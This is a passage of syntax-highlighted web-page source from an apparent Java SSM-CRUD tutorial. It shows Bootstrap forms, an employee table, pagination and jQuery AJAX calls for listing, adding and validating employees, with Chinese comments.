<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            部门提交部门id即可-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-  部门名称-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>关闭<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_update_btn"</span>&gt;</span>更新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span> <span class="attr">id</span>=<span class="string">"emp_delete_all_btn"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"check_all"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    员工数据等-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示页码等信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    var totalRecords,currentPage;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //去首页</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.解析并显示分页条数据</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空table</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var checkBoxTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'checkbox'</span> <span class="attr">class</span>=<span class="string">'check_item'</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             编辑</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm edit_btn")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">            //为编辑按钮添加一个自定义的属性，来表示当前员工id</span></span><br><span class="line"><span class="xml">            editBtn.attr("edit-id",item.empId);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             删除</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm delete_btn")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"><span class="xml">            //为删除按钮添加一个自定义的属性，来表示当前员工id</span></span><br><span class="line"><span class="xml">            delBtn.attr("del-id",item.empId);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(checkBoxTd)</span></span><br><span class="line"><span class="xml">                .append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页信息</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //清空分页信息</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"条记录");</span></span><br><span class="line"><span class="xml">        totalRecords = result.extend.pageInfo.total;</span></span><br><span class="line"><span class="xml">        currentPage = result.extend.pageInfo.pageNum;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //解析显示分页条,点击分页要能去下一页等等....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("首页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("末页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //添加首页和前一页的提示</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....遍历给ul中添加页码提示</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //添加后一页和末页的提示</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //把ul加入到nav元素中</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //清空表单样式及内容</span></span><br><span class="line"><span class="xml">    function reset_form(ele)&#123;</span></span><br><span class="line"><span class="xml">        $(ele)[0].reset();</span></span><br><span class="line"><span class="xml">        //清空样式</span></span><br><span class="line"><span class="xml">        $(ele).find("*").removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).find(".help-block").text("");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击新增按钮弹出模态框</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //清除数据，表单重置</span></span><br><span class="line"><span class="xml">        reset_form($("#empAddModal form"));</span></span><br><span class="line"><span class="xml">        //发送ajax请求，查出部门信息，显示在下拉列表</span></span><br><span class="line"><span class="xml">        getDepts("#empAddModal select");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //弹出模态框</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //查出所有的部门信息并显示在下拉列表中</span></span><br><span class="line"><span class="xml">    function getDepts(ele) &#123;</span></span><br><span class="line"><span class="xml">        //清空之前下拉列表的值</span></span><br><span class="line"><span class="xml">        $(ele).empty();</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //显示部门信息在下拉列表中</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo(ele)</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //校验表单数据</span></span><br><span class="line"><span class="xml">    function validata_add_form()&#123;</span></span><br><span class="line"><span class="xml">        //1. 拿到要检验的数据，使用正则表达式</span></span><br><span class="line"><span class="xml">        var empName = $("#empName_add_input").val();</span></span><br><span class="line"><span class="xml">        var regName = /(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/;</span></span><br><span class="line"><span class="xml">        if(!regName.test(empName))&#123;</span></span><br><span class="line"><span class="xml">            // alert("用户名可以是2-5位中文或6-16位英文和数字的组合");</span></span><br><span class="line"><span class="xml">            //清空这个元素之前的样式</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","error","用户名可以是2-5位中文或6-16位英文和数字的组合");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2. 校验邮箱信息</span></span><br><span class="line"><span class="xml">        var email = $("#email_add_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","error","邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        return true;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //显示校验信息</span></span><br><span class="line"><span class="xml">    function show_validate_msg(ele,status,msg)&#123;</span></span><br><span class="line"><span class="xml">        //清空这个元素之前的样式</span></span><br><span class="line"><span class="xml">        $(ele).parent().removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).next("span").text("");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        if(status == "success")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-success");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;else if(status == "error")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-error");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //校验用户名是否可用</span></span><br><span class="line"><span class="xml">    $("#empName_add_input").change(function () &#123;</span></span><br><span class="line"><span class="xml">        //发送ajax请求校验用户名是否可用</span></span><br><span class="line"><span class="xml">        var empName = this.value;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/checkUser",</span></span><br><span class="line"><span class="xml">            data:"empName="+empName,</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","success","用户名可用");</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","success");</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","error",result.extend.va_msg);</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","error");</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击保存，保存员工</span></span><br><span class="line"><span class="xml">    $("#emp_save_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line"><span class="xml">        //2.先对要提交给服务器的数据进行校验</span></span><br><span class="line"><span class="xml">        if(!validata_add_form())&#123;</span></span><br><span class="line"><span 